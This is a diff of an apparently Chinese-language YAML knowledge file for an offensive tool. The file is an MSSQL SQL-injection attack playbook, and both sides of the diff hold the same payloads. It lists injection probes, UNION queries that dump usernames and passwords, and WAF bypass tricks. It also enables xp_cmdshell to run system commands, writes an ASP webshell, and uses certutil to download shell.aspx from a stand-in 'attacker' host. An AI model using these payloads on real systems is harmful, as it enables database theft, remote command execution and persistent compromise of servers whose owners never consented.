@@ -1,181 +1,33 @@
-name: "SQL注入攻击"
-description: "MySQL、MSSQL、Oracle、PostgreSQL等数据库的SQL注入技术"
-domain: "web"
-version: "1.0"
+name: SQL注入攻击
+description: MySQL、MSSQL、Oracle、PostgreSQL等数据库的SQL注入技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - sqli
-  - injection
-  - database
-
-knowledge: |
-  # MSSQL注入
-  
-  ## 2.1 基础探测 (sqli-mssql-basic)
-  
-  ### 执行步骤
-  
-  #### 1. 探测注入点
-  
-  ```sql
-  ' OR 1=1--
-  ' OR '1'='1
-  1' AND 1=1--
-  1' AND 1=2--
-  ```
-  
-  #### 2. 获取版本信息
-  
-  ```sql
-  ' UNION SELECT 1,@@version,3--
-  ' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
-  ' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
-  ```
-  
-  #### 3. 获取用户信息
-  
-  ```sql
-  ' UNION SELECT 1,user_name(),3--
-  ' UNION SELECT 1,suser_name(),3--
-  ' UNION SELECT 1,system_user,3--
-  ' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
-  ```
-  
-  #### 4. 获取数据库信息
-  
-  ```sql
-  ' UNION SELECT 1,db_name(),3--
-  ' UNION SELECT 1,db_name(0),3--
-  ' UNION SELECT name,2,3 FROM master..sysdatabases--
-  ```
-  
-  #### 5. 获取表名
-  
-  ```sql
-  ' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
-  ' UNION SELECT 1,name,3 FROM sys.tables--
-  ' UNION SELECT 1,table_name,3 FROM information_schema.tables--
-  ```
-  
-  #### 6. 获取列名
-  
-  ```sql
-  ' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
-  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
-  ```
-  
-  #### 7. 提取数据
-  
-  ```sql
-  ' UNION SELECT 1,username+':'+password,3 FROM users--
-  ' UNION SELECT TOP 1 username,password,3 FROM users--
-  ```
-  
-  ### WAF绕过
-  
-  #### Hex编码
-  
-  ```sql
-  ' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
-  ```
-  
-  #### 注释绕过
-  
-  ```sql
-  '/**/UNION/**/SELECT/**/1,2,3--
-  ' UN%00ION SELECT 1,2,3--
-  ```
-  
-  ---
-  
-  ## 2.2 高级技术 - xp_cmdshell (sqli-mssql-advanced)
-  
-  ### 执行步骤
-  
-  #### 1. 检测xp_cmdshell状态
-  
-  ```sql
-  ' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
-  '; EXEC master..xp_cmdshell 'whoami'--
-  ```
-  
-  #### 2. 开启xp_cmdshell
-  
-  ```sql
-  '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
-  ```
-  
-  #### 3. 执行系统命令
-  
-  ```sql
-  '; EXEC master..xp_cmdshell 'whoami'--
-  '; EXEC master..xp_cmdshell 'net user'--
-  '; EXEC master..xp_cmdshell 'dir C:\'--
-  ```
-  
-  #### 4. 写入WebShell
-  
-  ```sql
-  '; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
-  '; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
-  ```
-  
-  #### 5. SP_OACREATE方法
-  
-  ```sql
-  '; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
-  DECLARE @shell INT;
-  EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
-  EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
-  ```
-  
-  ### WAF绕过 - 堆叠查询
-  
-  ```sql
-  '; EXEC('EXEC master..xp_cmdshell ''whoami''')-- 
-  '; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
-  ```
-  
-  ---
-  
-  ## 攻击链示例
-  
-  ### 基础利用流程
-  
-  1. **探测注入点类型**
-  2. **获取版本和用户信息**
-  3. **枚举数据库结构**
-  4. **提取敏感数据**
-  
-  ### 高级利用流程
-  
-  1. **检测当前用户权限**
-  2. **尝试开启xp_cmdshell**
-  3. **执行系统命令**
-  4. **写入WebShell或添加用户**
-  5. **如果xp_cmdshell被禁，尝试SP_OACREATE**
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- sqli
+- injection
+- database
+knowledge: "# MSSQL注入\n\n## 2.1 基础探测 (sqli-mssql-basic)\n\n### 执行步骤\n\n#### 1. 探测注入点\n\n```sql\n' OR 1=1--\n' OR '1'='1\n\
+  1' AND 1=1--\n1' AND 1=2--\n```\n\n#### 2. 获取版本信息\n\n```sql\n' UNION SELECT 1,@@version,3--\n' UNION SELECT 1,SERVERPROPERTY('Edition'),3--\n\
+  ' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--\n```\n\n#### 3. 获取用户信息\n\n```sql\n' UNION SELECT 1,user_name(),3--\n\
+  ' UNION SELECT 1,suser_name(),3--\n' UNION SELECT 1,system_user,3--\n' UNION SELECT 1,is_srvrolemember('sysadmin'),3--\n\
+  ```\n\n#### 4. 获取数据库信息\n\n```sql\n' UNION SELECT 1,db_name(),3--\n' UNION SELECT 1,db_name(0),3--\n' UNION SELECT name,2,3\
+  \ FROM master..sysdatabases--\n```\n\n#### 5. 获取表名\n\n```sql\n' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--\n\
+  ' UNION SELECT 1,name,3 FROM sys.tables--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--\n```\n\n#### 6.\
+  \ 获取列名\n\n```sql\n' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--\n' UNION\
+  \ SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--\n```\n\n#### 7. 提取数据\n\n```sql\n' UNION\
+  \ SELECT 1,username+':'+password,3 FROM users--\n' UNION SELECT TOP 1 username,password,3 FROM users--\n```\n\n### WAF绕过\n\
+  \n#### Hex编码\n\n```sql\n' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--\n```\n\
+  \n#### 注释绕过\n\n```sql\n'/**/UNION/**/SELECT/**/1,2,3--\n' UN%00ION SELECT 1,2,3--\n```\n\n---\n\n## 2.2 高级技术 - xp_cmdshell\
+  \ (sqli-mssql-advanced)\n\n### 执行步骤\n\n#### 1. 检测xp_cmdshell状态\n\n```sql\n' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--\n\
+  '; EXEC master..xp_cmdshell 'whoami'--\n```\n\n#### 2. 开启xp_cmdshell\n\n```sql\n'; EXEC sp_configure 'show advanced options',\
+  \ 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--\n```\n\n#### 3. 执行系统命令\n\n```sql\n'; EXEC master..xp_cmdshell\
+  \ 'whoami'--\n'; EXEC master..xp_cmdshell 'net user'--\n'; EXEC master..xp_cmdshell 'dir C:\\'--\n```\n\n#### 4. 写入WebShell\n\
+  \n```sql\n'; EXEC master..xp_cmdshell 'echo ^<%execute(request(\"cmd\"))^> > C:\\inetpub\\wwwroot\\shell.asp'--\n'; EXEC\
+  \ master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\\inetpub\\wwwroot\\shell.aspx'--\n```\n\
+  \n#### 5. SP_OACREATE方法\n\n```sql\n'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\nDECLARE @shell INT;\n\
+  EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;\nEXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\\output.txt';--\n\
+  ```\n\n### WAF绕过 - 堆叠查询\n\n```sql\n'; EXEC('EXEC master..xp_cmdshell ''whoami''')-- \n'; DECLARE @cmd VARCHAR(255); SET\
+  \ @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--\n```\n\n---\n\n## 攻击链示例\n\n### 基础利用流程\n\n1. **探测注入点类型**\n2. **获取版本和用户信息**\n\
+  3. **枚举数据库结构**\n4. **提取敏感数据**\n\n### 高级利用流程\n\n1. **检测当前用户权限**\n2. **尝试开启xp_cmdshell**\n3. **执行系统命令**\n4. **写入WebShell或添加用户**\n\
+  5. **如果xp_cmdshell被禁，尝试SP_OACREATE**\n"
